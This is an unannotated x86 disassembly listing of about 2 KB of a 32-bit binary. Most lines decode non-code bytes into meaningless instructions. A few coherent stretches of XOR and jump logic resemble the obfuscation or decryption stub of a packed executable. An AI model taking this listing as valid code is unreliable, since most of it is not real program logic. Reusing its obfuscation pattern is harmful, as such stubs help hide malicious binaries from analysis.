  4020cb:	lds    edi,FWORD PTR [eax-0x5660841e]
  4020d1:	les    eax,FWORD PTR [ecx+0x63]
  4020d4:	and    cl,dl
  4020d6:	arpl   WORD PTR [ebp*4+0x6e864492],bp
  4020dd:	pop    edi
  4020de:	add    al,0x49
  4020e0:	jp     0x402075
  4020e2:	push   edx
  4020e3:	sar    DWORD PTR [edi-0x5e52cd35],cl
  4020e9:	xor    eax,0xab0f9063
  4020ee:	int3   
  4020ef:	push   es
  4020f0:	pop    ecx
  4020f1:	push   ds
  4020f2:	(bad)  
  4020f3:	outs   dx,BYTE PTR ds:[esi]
  4020f4:	jb     0x40212e
  4020f6:	fsubr  DWORD PTR [ecx-0x68]
  4020f9:	ss out 0xb7,al
  4020fc:	in     al,dx
  4020fd:	dec    esi
  4020fe:	sbb    DWORD PTR [esi],esp
  402100:	xlat   BYTE PTR ds:[ebx]
  402101:	addr16 dec bp
  402104:	sub    al,0x8
  402106:	jecxz  0x402110
  402108:	xor    DWORD PTR [ebp+0x4d],0xffffffa0
  40210c:	dec    ebp
  40210d:	sahf   
  40210e:	and    al,0xe2
  402110:	(bad)  
  402111:	fidivr WORD PTR [edi+0x6e435c1d]
  402117:	data16 in al,dx
  402119:	cmp    dh,bh
  40211b:	sub    ah,al
  40211d:	inc    eax
  40211e:	out    0xde,eax
  402120:	xor    al,0xdb
  402122:	inc    edx
  402123:	xlat   BYTE PTR ds:[ebx]
  402124:	mov    ebx,DWORD PTR [ecx-0x9]
  402127:	mov    al,ah
  402129:	pop    es
  40212a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40212b:	inc    ebp
  40212c:	es aas 
  40212e:	jno    0x402191
  402130:	std    
  402131:	pop    ebx
  402132:	rcr    BYTE PTR [edi-0x5b],cl
  402135:	push   ss
  402136:	push   ss
  402137:	push   edx
  402138:	dec    ebp
  402139:	outs   dx,BYTE PTR ds:[esi]
  40213a:	and    ch,ah
  40213c:	call   0x36e0:0xcb3bfe04
  402143:	stos   DWORD PTR es:[edi],eax
  402144:	retf   0x407d
  402147:	xchg   edx,eax
  402148:	popa   
  402149:	in     eax,dx
  40214a:	jbe    0x402170
  40214c:	fmul   st,st(4)
  40214e:	jne    0x4020d8
  402150:	sub    edi,esi
  402152:	pop    esi
  402153:	scas   eax,DWORD PTR es:[edi]
  402154:	retf   0x5583
  402157:	fdiv   DWORD PTR [esp-0x57]
  40215b:	lahf   
  40215c:	nop
  40215d:	jg     0x402129
  40215f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402160:	ret    0xb298
  402163:	cli    
  402164:	fidiv  DWORD PTR [ecx-0x1e232d66]
  40216a:	mov    al,0x3f
  40216c:	and    DWORD PTR [esi+esi*8+0x25a94cdd],esi
  402173:	mov    eax,ds:0x18e22f65
  402178:	and    DWORD PTR ds:0x18330f95,ecx
  40217e:	addr16 jnp 0x402188
  402181:	imul   esi,DWORD PTR [edx+edx*4],0x73
  402185:	scas   al,BYTE PTR es:[edi]
  402186:	or     ebp,edi
  402188:	pop    eax
  402189:	inc    ecx
  40218a:	mov    esp,0xff3db671
  40218f:	test   eax,0x35402cbc
  402194:	dec    edx
  402195:	and    ecx,edx
  402197:	cmp    dl,BYTE PTR [esi+ebp*2+0x6b7e7df4]
  40219e:	out    0x36,al
  4021a0:	push   eax
  4021a1:	xor    bh,BYTE PTR [eax+0xb7940d4]
  4021a7:	xchg   ebp,eax
  4021a8:	ret    
  4021a9:	fsubr  st,st(2)
  4021ab:	jno    0x40215d
  4021ad:	sbb    esp,esp
  4021af:	test   al,0xa2
  4021b1:	hlt    
  4021b2:	push   ebx
  4021b3:	add    DWORD PTR [edx],ebx
  4021b5:	push   edx
  4021b6:	xchg   edx,eax
  4021b7:	(bad)  
  4021b8:	out    0x31,al
  4021ba:	shl    DWORD PTR [eax+ecx*4],cl
  4021bd:	xchg   ecx,eax
  4021be:	fldenv [edi]
  4021c0:	call   0x248baf95
  4021c5:	add    DWORD PTR ds:0x867b5a86,esp
  4021cb:	hlt    
  4021cc:	jnp    0x402236
  4021ce:	out    0xfe,al
  4021d0:	shl    DWORD PTR [edx],1
  4021d2:	mov    edx,0x8dd233ec
  4021d7:	jp     0x402190
  4021d9:	out    dx,eax
  4021da:	test   BYTE PTR [esi+ebx*4-0x4b],0x1f
  4021df:	ds (bad) 
  4021e2:	test   eax,0x60235c62
  4021e7:	cdq    
  4021e8:	fdivr  QWORD PTR [ebp+0x859d3ca]
  4021ee:	or     BYTE PTR [ebx],al
  4021f0:	sub    ah,ah
  4021f2:	les    edi,FWORD PTR [edx]
  4021f4:	mov    ds:0x12af2111,al
  4021f9:	push   cs
  4021fa:	mov    edi,0x5a216300
  4021ff:	mov    eax,ds:0x4c33cdc1
  402204:	dec    esi
  402205:	xchg   BYTE PTR [edi],ah
  402207:	dec    ecx
  402208:	test   eax,0x363e8a5b
  40220d:	sub    edx,0xffffff94
  402210:	test   DWORD PTR [ebp+0x22],esp
  402213:	push   ss
  402214:	stos   DWORD PTR es:[edi],eax
  402215:	xchg   BYTE PTR [ebx+0x13],al
  402218:	mov    eax,0x22787fd3
  40221d:	repnz mov esi,0xd12fe2f8
  402223:	dec    edx
  402224:	stc    
  402225:	out    dx,eax
  402226:	cmp    ecx,esi
  402228:	sbb    cl,BYTE PTR [edx]
  40222a:	push   esi
  40222b:	xchg   esp,eax
  40222c:	lods   al,BYTE PTR ds:[esi]
  40222d:	add    bh,BYTE PTR [eax]
  40222f:	push   ss
  402230:	stos   BYTE PTR es:[edi],al
  402231:	mov    dl,0x7e
  402233:	std    
  402234:	ret    0x5682
  402237:	cli    
  402238:	mov    ch,0x33
  40223a:	int3   
  40223b:	in     eax,0xd8
  40223d:	mov    al,0x8a
  40223f:	mov    ebx,0xe2e738ce
  402244:	lahf   
  402245:	or     edi,DWORD PTR [esi+edx*1+0x6f]
  402249:	lods   al,BYTE PTR ds:[esi]
  40224a:	mov    al,ds:0xbb2a7009
  40224f:	inc    ebx
  402250:	dec    ebp
  402251:	and    bh,cl
  402253:	frstor [ebx]
  402255:	and    bh,0x3
  402258:	adc    eax,0xe013942e
  40225d:	xchg   ebx,eax
  40225e:	loope  0x40225b
  402260:	repz pop eax
  402262:	xchg   edx,eax
  402263:	jecxz  0x402229
  402265:	mov    bl,0xa7
  402267:	mov    eax,0xe404e715
  40226c:	ins    BYTE PTR es:[edi],dx
  40226d:	adc    al,0xac
  40226f:	mov    ah,bh
  402271:	les    esp,FWORD PTR [ecx]
  402273:	or     edi,DWORD PTR [ecx]
  402275:	or     cl,BYTE PTR [edi]
  402277:	test   BYTE PTR [ecx-0x74fffffc],al
  40227d:	inc    ebp
  40227e:	in     al,dx
  40227f:	xor    eax,ecx
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    DWORD PTR [ebp-0x56],ecx
  40229c:	cs loopne 0x40230f
  40229f:	add    dh,BYTE PTR [eax+0x70]
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	out    0xe3,eax
  4022a8:	xchg   ecx,eax
  4022a9:	mov    eax,ds:0xe961c406
  4022ae:	cmp    esi,0x2e
  4022b1:	push   esi
  4022b2:	je     0x402281
  4022b4:	or     BYTE PTR [eax],ah
  4022b6:	sti    
  4022b7:	test   BYTE PTR [esi+0x11],bh
  4022ba:	ins    DWORD PTR es:[edi],dx
  4022bb:	retf   
  4022bc:	dec    edx
  4022bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022be:	popf   
  4022bf:	call   0xc131:0x977b38c3
  4022c6:	neg    BYTE PTR [ebx-0x2975122c]
  4022cc:	aad    0x2
  4022ce:	retf   0xa05c
  4022d1:	das    
  4022d2:	and    ebx,DWORD PTR ds:0x7af4dbe3
  4022d8:	popf   
  4022d9:	adc    DWORD PTR [eax],edx
  4022db:	jns    0x4022bf
  4022dd:	outs   dx,DWORD PTR ds:[esi]
  4022de:	pop    es
  4022df:	xor    al,0x0
  4022e1:	scas   al,BYTE PTR es:[edi]
  4022e2:	jmp    0x4022e1
  4022e4:	dec    edi
  4022e5:	stos   BYTE PTR es:[edi],al
  4022e6:	ret    0x2d21
  4022e9:	ret    
  4022ea:	add    ecx,DWORD PTR [eax]
  4022ec:	imul   ebx,DWORD PTR [ebx+edx*4],0x492795d9
  4022f3:	mov    edx,0x32ee0c73
  4022f8:	xor    eax,0x71c8f9d0
  4022fd:	test   BYTE PTR [ecx-0x1475c27b],bl
  402303:	pop    eax
  402304:	test   eax,0x9efa2a5e
  402309:	cwde   
  40230a:	inc    esi
  40230b:	mov    ss,WORD PTR [ecx+ecx*4+0x5003802d]
  402312:	pop    ss
  402313:	loope  0x402304
  402315:	js     0x4022a3
  402317:	pop    ss
  402318:	stos   BYTE PTR es:[edi],al
  402319:	jecxz  0x4022fe
  40231b:	cmc    
  40231c:	xor    DWORD PTR [ecx],edx
  40231e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40231f:	dec    ebp
  402320:	and    edx,DWORD PTR [esi-0x1f]
  402323:	dec    ecx
  402324:	xchg   BYTE PTR [esi+0x7ea58a21],bh
  40232a:	dec    ebx
  40232b:	jge    0x4022fa
  40232d:	jb     0x4022f5
  40232f:	add    eax,0xc1647292
  402334:	test   BYTE PTR [edx],bl
  402336:	mov    eax,ds:0x482a51e8
  40233b:	and    ebp,DWORD PTR [ecx+0x5403fce3]
  402341:	push   ss
  402342:	adc    eax,DWORD PTR [edi+0x2ce3c238]
  402348:	xchg   BYTE PTR [ebx-0x38e069e7],ch
  40234e:	pop    ebx
  40234f:	push   ecx
  402350:	pop    ebx
  402351:	inc    ebp
  402352:	jge    0x4022d8
  402354:	or     BYTE PTR ds:0x91574aae,dl
  40235a:	xlat   BYTE PTR ds:[ebx]
  40235b:	lods   al,BYTE PTR ds:[esi]
  40235c:	xor    DWORD PTR [esi],eax
  40235e:	xor    bl,BYTE PTR [ebp+0x7]
  402361:	dec    edi
  402362:	pop    eax
  402363:	or     eax,0x42cb561
  402368:	push   ebp
  402369:	jg     0x402328
  40236b:	retf   
  40236c:	int3   
  40236d:	mov    ds:0x66ca3a31,al
  402372:	idiv   BYTE PTR [ebx-0x39]
  402375:	add    BYTE PTR [edi+0x74],0xe2
  402379:	mov    ?,WORD PTR [eax+ecx*1-0x450a9c71]
  402380:	retf   0x440f
  402383:	mov    WORD PTR [edi+0x37b6cc54],fs
  402389:	jle    0x4023a2
  40238b:	imul   edx,DWORD PTR [esp+esi*4+0x3eabf909],0x4b
  402393:	jg     0x402367
  402395:	add    DWORD PTR ss:[edi],eax
  402398:	out    0x47,al
  40239a:	loopne 0x4023b8
  40239c:	jge    0x402416
  40239e:	adc    eax,0x4ff8b0d
  4023a3:	neg    BYTE PTR [ecx-0x72c0f31a]
  4023a9:	fcmove st,st(1)
  4023ab:	or     DWORD PTR [ecx-0x453411c0],0xaebe06e5
  4023b5:	cmp    al,0x92
  4023b7:	add    al,0xd0
  4023b9:	icebp  
  4023ba:	jns    0x4023bf
  4023bc:	mov    esi,fs
  4023be:	cmp    eax,0xfcd5519e
  4023c3:	adc    bh,bl
  4023c5:	mov    BYTE PTR [edi+0x27],bh
  4023c8:	and    esi,ebx
  4023ca:	jecxz  0x402381
  4023cc:	dec    edx
  4023cd:	loop   0x40236b
  4023cf:	shr    DWORD PTR [esi+0x4e],cl
  4023d2:	fist   DWORD PTR [edx+0x65b4a659]
  4023d8:	xchg   edi,eax
  4023d9:	outs   dx,BYTE PTR ds:[esi]
  4023da:	dec    ebx
  4023db:	mov    WORD PTR [esi-0x4f879c29],es
  4023e1:	mov    al,ds:0x25aa7a9d
  4023e6:	jle    0x4023ef
  4023e8:	bound  ebx,QWORD PTR [edi-0x2065bf60]
  4023ee:	or     ebx,DWORD PTR [ebp+0x38b1763c]
  4023f4:	(bad)  
  4023f5:	jns    0x4023e8
  4023f7:	sub    al,0x5e
  4023f9:	in     al,0x6c
  4023fb:	push   0xffffff9b
  4023fd:	push   esi
  4023fe:	xchg   edx,eax
  4023ff:	dec    edi
  402400:	fadd   QWORD PTR fs:[ecx+0x2883dfb2]
  402407:	stc    
  402408:	scas   eax,DWORD PTR es:[edi]
  402409:	mov    al,0x2b
  40240b:	cmp    dh,BYTE PTR [edi+0x1d27dcb4]
  402411:	out    dx,al
  402412:	dec    edi
  402413:	hlt    
  402414:	jo     0x40239b
  402416:	aas    
  402417:	xchg   ecx,eax
  402418:	jne    0x40246d
  40241a:	pop    edx
  40241b:	cmp    esp,DWORD PTR [eax]
  40241d:	das    
  40241e:	mov    ds:0x66240fe7,al
  402423:	cmp    bh,BYTE PTR [esi]
  402425:	sbb    ebp,DWORD PTR [ecx+0x411a63f2]
  40242b:	mov    bh,0x7d
  40242d:	jno    0x40245f
  40242f:	out    dx,al
  402430:	nop
  402431:	adc    eax,0xfa95da0
  402436:	xor    DWORD PTR ss:[ebx+0x2ff53e93],eax
  40243d:	(bad)  
  40243e:	xor    DWORD PTR [eax-0x84943d2],ecx
  402444:	jge    0x402453
  402446:	lods   eax,DWORD PTR ds:[esi]
  402447:	aad    0x22
  402449:	sub    bh,BYTE PTR [ebx]
  40244b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40244c:	jmp    0x4023dd
  40244e:	dec    ecx
  40244f:	push   es
  402450:	xchg   dl,al
  402452:	pop    ebp
  402453:	fild   WORD PTR [eax-0x4e]
  402456:	fdiv   QWORD PTR [ecx]
  402458:	ins    BYTE PTR es:[edi],dx
  402459:	sbb    DWORD PTR [edx-0x3a],ecx
  40245c:	les    ecx,FWORD PTR [edi-0x199eb110]
  402462:	dec    esi
  402463:	mov    edx,0x1e84273d
  402468:	sbb    DWORD PTR [edx-0x39],eax
  40246b:	shl    BYTE PTR [esi],cl
  40246d:	mov    esp,0xd6971b4f
  402472:	div    bl
  402474:	out    dx,al
  402475:	sbb    ebx,DWORD PTR [esi-0x53]
  402478:	dec    ebp
  402479:	push   ebp
  40247a:	ret    0x8cdc
  40247d:	sbb    al,0xe9
  40247f:	cmp    dl,BYTE PTR [ebx-0x4f]
  402482:	stos   DWORD PTR es:[edi],eax
  402483:	in     al,0x30
  402485:	cmc    
  402486:	or     al,0x28
  402488:	lods   al,BYTE PTR ds:[esi]
  402489:	dec    ebx
  40248a:	bound  eax,QWORD PTR [edi+0x1360f07]
  402490:	call   0x145f08d5
  402495:	jmp    0x89281d36
  40249a:	lahf   
  40249b:	jecxz  0x402510
  40249d:	inc    DWORD PTR [edi+0x78]
  4024a0:	mov    al,0x3
  4024a2:	js     0x4024c5
  4024a4:	mov    ch,0x9d
  4024a6:	mov    dx,WORD PTR [ebp-0x38]
  4024aa:	mov    ebx,0x8a3e
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x5d846737],cl
  4024f4:	ret    0x70
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	pop    edx
  4024fe:	inc    esp
  4024ff:	push   cs
  402500:	dec    edx
  402501:	cs in  al,0x0
  402504:	adc    al,0x1a
  402506:	mov    bh,BYTE PTR [eax+0x282da3d0]
  40250c:	sti    
  40250d:	mov    ds:0x71afa82,al
  402512:	retf   
  402513:	in     eax,0x59
  402515:	in     al,0x6e
  402517:	popa   
  402518:	push   ebp
  402519:	push   edx
  40251a:	pop    ebp
  40251b:	mov    al,0x21
  40251d:	gs repz and eax,0x133faac8
  402524:	(bad)  
  402526:	adc    BYTE PTR [ebx],bl
  402528:	mov    cl,0x3a
  40252a:	mov    bh,0xc9
  40252c:	mov    cl,0x5c
  40252e:	dec    esp
  40252f:	int3   
  402530:	mov    eax,ds:0xbb3dbd3d
  402535:	add    al,0x55
  402537:	test   eax,0x45c6aad3
  40253c:	cmp    DWORD PTR [ecx],ecx
  40253e:	mov    cl,0xf
  402540:	sub    BYTE PTR [eax-0x43],bl
  402543:	push   0x770e1438
  402548:	fistp  WORD PTR [ecx]
  40254a:	loop   0x40255c
  40254c:	push   cs
  40254d:	add    eax,0x21a8ca40
  402552:	push   fs
  402554:	jp     0x40254f
  402556:	retf   
  402557:	cmovb  esp,DWORD PTR [eax-0x70]
  40255b:	hlt    
  40255c:	or     al,0x3b
  40255e:	mov    esp,0x831d06a3
  402563:	nop
  402564:	fsub   QWORD PTR [esi-0x59]
  402567:	or     cl,ch
  402569:	inc    ecx
  40256a:	test   al,0x5a
  40256c:	adc    edi,DWORD PTR [edx]
  40256e:	test   BYTE PTR [edi-0x1e],cl
  402571:	loopne 0x402573
  402573:	add    eax,0x44a6e061
  402578:	mov    ah,0xd1
  40257a:	cld    
  40257b:	xchg   ebx,eax
  40257c:	inc    edx
  40257d:	xor    al,0x61
  40257f:	dec    ebp
  402580:	or     al,0x68
  402582:	rcr    DWORD PTR [esi+esi*2+0x62f644a3],0xd2
  40258a:	lods   al,BYTE PTR ds:[esi]
  40258b:	mov    BYTE PTR [esi-0x4e622afe],cl
  402591:	out    0xc9,eax
  402593:	shl    DWORD PTR [ecx],0xe4
  402596:	jo     0x4025a7
  402598:	jb     0x4025fc
  40259a:	popa   
  40259b:	mov    ecx,0x3b551351
  4025a0:	in     al,0x6f
  4025a2:	push   ecx
  4025a3:	hlt    
  4025a4:	mov    esi,0x7e06df27
  4025a9:	out    0x62,al
  4025ab:	dec    eax
  4025ac:	sbb    al,dh
  4025ae:	or     al,0x72
  4025b0:	das    
  4025b1:	jp     0x402590
  4025b3:	sbb    DWORD PTR [edx],0xad6b3f73
  4025b9:	jp     0x402589
  4025bb:	daa    
  4025bc:	cmc    
  4025bd:	lock pop ecx
  4025bf:	cmp    DWORD PTR [eax-0x8],edi
  4025c2:	test   eax,0x91b72915
  4025c7:	(bad)  
  4025c8:	cli    
  4025c9:	lods   al,BYTE PTR ds:[esi]
  4025ca:	dec    ebx
  4025cb:	push   ss
  4025cc:	pop    es
  4025cd:	in     eax,dx
  4025ce:	imul   ebx,DWORD PTR ds:0xfd3bea51,0xffffffc6
  4025d5:	or     BYTE PTR [ebp+0x68b1ff76],0x71
  4025dc:	hlt    
  4025dd:	(bad)
  4025e1:	mov    cl,0x59
  4025e3:	push   0xa3b37600
  4025e8:	iret   
  4025e9:	fld    DWORD PTR [ecx+0x384e2c96]
  4025ef:	je     0x402647
  4025f1:	fisubr DWORD PTR [eax]
  4025f3:	sbb    ebx,DWORD PTR [ebx-0x3d]
  4025f6:	outs   dx,BYTE PTR ds:[esi]
  4025f7:	icebp  
  4025f8:	das    
  4025f9:	dec    ebx
  4025fa:	sbb    eax,0x99f95185
  4025ff:	xchg   edi,eax
  402600:	inc    edi
  402601:	(bad)  
  402602:	out    0x68,al
  402604:	or     ebp,DWORD PTR [edi+0x1c]
  402607:	inc    edi
  402608:	cmp    DWORD PTR [edx],edx
  40260a:	cmp    eax,0xdf0f916c
  40260f:	gs clc 
  402611:	push   0xffffffc3
  402613:	add    cl,BYTE PTR [ebp-0x577403ed]
  402619:	sbb    cl,BYTE PTR [ebx+0x7b]
  40261c:	retf   
  40261d:	dec    esp
  40261e:	mov    ch,0xba
  402620:	xchg   DWORD PTR [edi+0x40],esi
  402623:	sbb    BYTE PTR [eax+0x5d4a4b9e],dl
  402629:	push   eax
  40262a:	inc    edi
  40262b:	loope  0x40260f
  40262d:	test   ebx,eax
  40262f:	enter  0xf850,0x11
  402633:	adc    DWORD PTR [ebx-0x56],0x4a
  402637:	in     al,dx
  402638:	jb     0x40262e
  40263a:	pop    esp
  40263b:	loopne 0x40266b
  40263d:	pushf  
  40263e:	or     BYTE PTR [ebx-0x75],ah
  402641:	fwait
  402642:	mov    cl,0xfb
  402644:	cmp    DWORD PTR [edx+0x3bd84ac3],0xfffffff4
  40264b:	bound  ebx,QWORD PTR [eax+0x61da3f1e]
  402651:	popf   
  402652:	jmp    0x4026a7
  402654:	sub    al,0xc2
  402656:	xchg   edx,eax
  402657:	fadd   st,st(6)
  402659:	rcr    DWORD PTR [edx],cl
  40265b:	outs   dx,BYTE PTR ds:[esi]
  40265c:	inc    ecx
  40265d:	test   eax,0xf395d48b
  402662:	out    dx,al
  402663:	pop    ds
  402664:	sub    al,0xa5
  402666:	mov    ebx,0xb42bddee
  40266b:	cdq    
  40266c:	test   ah,al
  40266e:	es jns 0x40262d
  402671:	(bad)  
  402672:	adc    BYTE PTR [eax*8+0x5a6577f6],dl
  402679:	lea    ebp,[edi-0x731bf821]
  40267f:	out    0x6d,al
  402681:	pushf  
  402682:	je     0x402628
  402684:	out    0x6e,eax
  402686:	hlt    
  402687:	sar    BYTE PTR [eax],cl
  402689:	cli    
  40268a:	aas    
  40268b:	(bad)  
  40268c:	ret    
  40268d:	mov    ebp,0x962f3f82
  402692:	not    BYTE PTR [ecx+0x1d]
  402695:	leave  
  402696:	out    0x30,al
  402698:	stc    
  402699:	jl     0x40265f
  40269b:	rol    BYTE PTR [ecx],1
  40269d:	add    BYTE PTR [eax+0x5dca35f9],dh
  4026a3:	push   esi
  4026a4:	pop    eax
  4026a5:	pushw  0xffc3
  4026a8:	lods   al,BYTE PTR ds:[esi]
  4026a9:	dec    ebp
  4026aa:	lods   eax,DWORD PTR ds:[esi]
  4026ab:	dec    ebp
  4026ac:	or     DWORD PTR [eax+0x4b3c57e0],esi
  4026b2:	sub    cl,dl
  4026b4:	shr    BYTE PTR [edi+ebp*1],cl
  4026b7:	sub    al,0x82
  4026b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026ba:	sbb    eax,0x362b4c4e
  4026bf:	push   ss
  4026c0:	pop    esi
  4026c1:	out    0x50,al
  4026c3:	pop    edi
  4026c4:	mov    bh,0xc3
  4026c6:	add    al,0x68
  4026c8:	mov    esp,?
  4026ca:	jo     0x402707
  4026cc:	pop    edx
  4026cd:	out    0xf6,al
  4026cf:	xchg   edx,eax
  4026d0:	mov    ah,0xe
  4026d2:	jno    0x402742
  4026d4:	pushf  
  4026d5:	xor    dl,ch
  4026d7:	adc    eax,0x3d75cdfc
  4026dc:	cs inc ecx
  4026de:	cdq    
  4026df:	hlt    
  4026e0:	pusha  
  4026e1:	imul   ebp,DWORD PTR [edx+0x3ac4f9b1],0x58
  4026e8:	in     al,0x50
  4026ea:	push   0x2b11c144
  4026ef:	ja     0x40274a
  4026f1:	xchg   ebp,eax
  4026f2:	cmp    BYTE PTR [ebx-0x68fad7a9],cl
  4026f8:	je     0x402762
  4026fa:	aaa    
  4026fb:	hlt    
  4026fc:	cmp    ecx,DWORD PTR [ebx+0x558bf445]
  402702:	call   0x7d7de93a
  402707:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  40270e:	add    BYTE PTR [eax],al
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x1e11f28a
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	pop    ss
  402768:	(bad)  
  402769:	pop    eax
  40276a:	push   ss
  40276b:	aaa    
  40276c:	mov    esp,0xbdfb50cb
  402771:	and    DWORD PTR [edx+0x23],ebp
  402774:	mov    esi,0xcf334fbb
  402779:	cmp    eax,DWORD PTR [edi-0x262802f7]
  40277f:	repnz test BYTE PTR [ebp+ebx*1-0x44],ch
  402784:	inc    ebp
  402785:	icebp  
  402786:	jecxz  0x4027d0
  402788:	sub    DWORD PTR [ecx-0x3cbe5fa2],0xfd985faf
  402792:	xor    ch,ah
  402794:	icebp  
  402795:	rcl    BYTE PTR [edi+0x16157612],0x42
  40279c:	push   esi
  40279d:	ss xor eax,0xb8402039
  4027a3:	jb     0x4027f6
  4027a5:	sti    
  4027a6:	(bad)  
  4027a7:	pusha  
  4027a8:	and    al,0x56
  4027aa:	ret    
  4027ab:	scas   eax,DWORD PTR es:[edi]
  4027ac:	pop    ds
  4027ad:	xor    ebp,DWORD PTR [ecx-0xe]
  4027b0:	imul   ebp,eax,0x1e
  4027b3:	sub    eax,0xa66ca6c0
  4027b8:	mov    cl,BYTE PTR [edi-0x65d33519]
  4027be:	repnz lea edx,[esi]
  4027c1:	aaa    
  4027c2:	lods   eax,DWORD PTR ds:[esi]
  4027c3:	shl    BYTE PTR [esi-0x6e],1
  4027c6:	or     bl,BYTE PTR [edi]
  4027c8:	sub    ebx,esi
  4027ca:	push   es
  4027cb:	mov    gs,WORD PTR [esi-0x5e]
  4027ce:	mov    ecx,0xddb818f5
  4027d3:	and    ch,0x22
  4027d6:	daa    
  4027d7:	pop    es
  4027d8:	sub    al,0xd0
  4027da:	jns    0x402854
  4027dc:	mov    al,ds:0xf5c230cc
  4027e1:	cmp    BYTE PTR [edi],cl
  4027e3:	jmp    0xb039:0x29b6910f
  4027ea:	rcr    cl,1
  4027ec:	ficomp DWORD PTR [esi]
  4027ee:	in     al,dx
  4027ef:	push   ss
  4027f0:	jp     0x402797
  4027f2:	and    BYTE PTR [esi+0x2393b351],0xa6
  4027f9:	adc    al,0x90
  4027fb:	cld    
  4027fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027fd:	add    DWORD PTR [eax+eax*2],ebp
  402800:	xchg   edi,eax
  402801:	xor    eax,0x83170241
  402806:	ins    BYTE PTR es:[edi],dx
  402807:	jg     0x402811
  402809:	push   ebp
  40280a:	jge    0x402880
  40280c:	and    ah,bl
  40280e:	add    al,0x11
  402810:	add    al,0x0
  402812:	mov    esi,0xded28422
  402817:	imul   esi,DWORD PTR [esi],0xfb3a2688
  40281d:	arpl   WORD PTR [esi+ebx*4+0x37],dx
  402821:	mov    ss,WORD PTR [edi-0x18]
  402824:	in     eax,0x62
  402826:	push   es
  402827:	xchg   edx,eax
  402828:	jp     0x4027b7
  40282a:	ret    
  40282b:	pop    es
  40282c:	bound  eax,QWORD PTR [ecx+0x63]
  40282f:	mov    edi,0x41db263a
  402834:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402835:	and    ah,bl
  402837:	or     al,0xa2
  402839:	outs   dx,DWORD PTR ds:[esi]
  40283a:	outs   dx,DWORD PTR ds:[esi]
  40283b:	cs xchg edx,eax
  40283d:	stc    
  40283e:	mov    ch,0x6d
  402840:	mov    edx,0x1075f459
  402845:	iret   
  402846:	popf   
  402847:	pushf  
  402848:	sar    DWORD PTR [eax+esi*2],1
  40284b:	dec    edi
  40284c:	lods   al,BYTE PTR ds:[esi]
  40284d:	dec    esp
  40284e:	sub    esp,ebp
  402850:	pop    eax
  402851:	fiadd  WORD PTR [ebp-0x434ec7df]
  402857:	mov    ah,0xf1
  402859:	(bad)  
  40285a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40285b:	ret    0x946
  40285e:	jp     0x4028aa
  402860:	stc    
  402861:	pop    ebp
  402862:	jle    0x4027f5
  402864:	lahf   
  402865:	jmp    0xde30:0xe8673a3e
  40286c:	out    0x50,eax
  40286e:	out    dx,eax
  40286f:	jbe    0x402836
  402871:	hlt    
  402872:	scas   al,BYTE PTR es:[edi]
  402873:	jne    0x4028ca
  402875:	xor    eax,0x80077964
  40287a:	pop    edx
  40287b:	dec    ecx
  40287c:	in     eax,dx
  40287d:	aam    0x6a
  40287f:	popaw  
  402881:	leave  
  402882:	xor    al,0x5f
  402884:	ja     0x40284e
  402886:	retf   
  402887:	icebp  
  402888:	hlt    
  402889:	or     esi,ebx
  40288b:	mov    ebp,0xad1bf27
  402890:	(bad)  [edx+0x25e1b6d]
  402896:	test   al,0x85
  402898:	jl     0x4028ee
  40289a:	(bad)  [edx]
  40289c:	xchg   al,ah
  40289e:	lds    esp,FWORD PTR [eax+0x24]
  4028a1:	(bad)  
  4028a2:	frstor [ebx-0x61fad28]
  4028a8:	mov    DWORD PTR [ecx],edx
  4028aa:	sbb    al,0x64
  4028ac:	clc    
  4028ad:	dec    esi
  4028ae:	int    0xe6
  4028b0:	cli    
  4028b1:	jmp    0xd44d:0xbfc08237
  4028b8:	pop    eax
